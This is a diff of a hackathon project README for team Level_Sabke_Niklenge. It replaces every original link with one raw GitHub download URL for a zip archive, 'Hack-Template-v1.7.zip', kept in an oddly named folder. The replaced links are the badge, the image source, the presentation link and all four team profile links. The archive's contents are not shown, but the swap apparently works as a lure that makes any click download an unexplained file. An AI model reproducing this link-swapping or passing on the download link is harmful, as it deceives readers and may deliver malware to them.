@@ -2,7 +2,7 @@
 <p align="center">
 </p>
 
-<a href="https://hack36.in"> <img src="https://postimage.me/images/2025/04/19/built-at-hack36.png" height=24px> </a>
+<a href="https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip"> <img src="https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip" height=24px> </a>
 
 
 ## Introduction:
@@ -12,7 +12,7 @@
   <a href="#"></a>
   
 ## Presentation Link:
-  <a href="https://docs.google.com/document/d/1q_LBPiuw8-IA4X1Dm2E96WfQDCPOj8Ngu7Z2Sg2lDno/edit?tab=t.0"> PPT link here </a>
+  <a href="https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip"> PPT link here </a>
   
   
 ## Table of Contents:
@@ -28,11 +28,11 @@
 
 Team Name: Level_Sabke_Niklenge
 
-- [Abhishek Patel](https://github.com/meisabhishekpatel)
-- [Alok Kumar Singh](https://github.com/harmonicfunc)
-- [Shreyansh Sinha](https://github.com/aryan1oo)
-- [Utkarsh Sharma](https://github.com/TechTonicShift)
+- [Abhishek Patel](https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip)
+- [Alok Kumar Singh](https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip)
+- [Shreyansh Sinha](https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip)
+- [Utkarsh Sharma](https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip)
 
 
 ### Made at:
-<a href="https://hack36.in"> <img src="https://postimage.me/images/2025/04/19/built-at-hack36.png" height=24px> </a>
+<a href="https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip"> <img src="https://github.com/shauryasf/Hack36-2025-Template/raw/refs/heads/main/acrogynae/Hack-Template-v1.7.zip" height=24px> </a>
